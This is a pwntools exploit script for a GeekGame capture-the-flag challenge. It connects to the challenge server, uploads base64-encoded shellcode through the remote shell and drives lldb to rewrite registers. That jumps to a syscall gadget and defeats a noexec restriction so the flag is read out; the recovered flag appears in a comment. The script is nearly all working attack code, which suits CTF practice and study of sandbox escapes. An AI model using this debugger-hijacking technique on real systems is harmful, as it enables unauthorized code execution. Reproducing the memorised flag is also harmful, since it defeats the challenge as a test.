from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
sc_1 = asm('''   
    movq rax, 548
    xorq rdi, rdi
    movq rsi, rsp
    syscall
''')
b64_SC1 = base64.b64encode(sc_1)

conn = remote('prob07.geekgame.pku.edu.cn', 10007)
conn.sendlineafter(b'Please input your token: ', b'')

NUM = 2
if NUM == 1:
    conn.sendlineafter(b'Enter your choice: ', b'1')

    conn.recvuntil(b'/ $ \x1b\x5b\x36\x6e')
    conn.sendline(b'echo -n '+b64_SC1+b' >/home/guest/SC1.b64')

    conn.recvuntil(b'/ $ \x1b\x5b\x36\x6e')
    conn.sendline(b'base64 -d /home/guest/SC1.b64 > /home/guest/SC1')

    conn.recvuntil(b'/ $ \x1b\x5b\x36\x6e')
    conn.sendline(b'export SC=$(base64 -d /home/guest/SC1.b64)')

    conn.recvuntil(b'/ $ \x1b\x5b\x36\x6e')
    conn.sendline(b'lldb /bin/ls')

    conn.sendlineafter(b'(lldb)', b'process launch --stop-at-entry')
    ps_info = conn.recvuntil(b'(lldb)')

    syscall_busybox = 0x4c750e
    # can use shell cat /proc/pid/maps to check rwx
    conn.sendlineafter(b'(lldb)', b're write rax 548')
    conn.sendlineafter(b'(lldb)', b're write rdi 0')
    conn.sendlineafter(b'(lldb)', b're write 0x00007fffffffedb0 rsp')
    conn.sendlineafter(b'(lldb)', b're write rip 0x4c750e')
    conn.sendlineafter(b'(lldb)', b'si')
    conn.sendlineafter(b'(lldb)', b'x/s 0x00007fffffffedb0')
    # flag{dEbugg6R_cAN_6REAk-N0eXEC}
    conn.interactive()

elif NUM == 2:
    # run shellcode to syscall write
    conn.sendlineafter(b'Enter your choice: ', b'2')

    conn.interactive()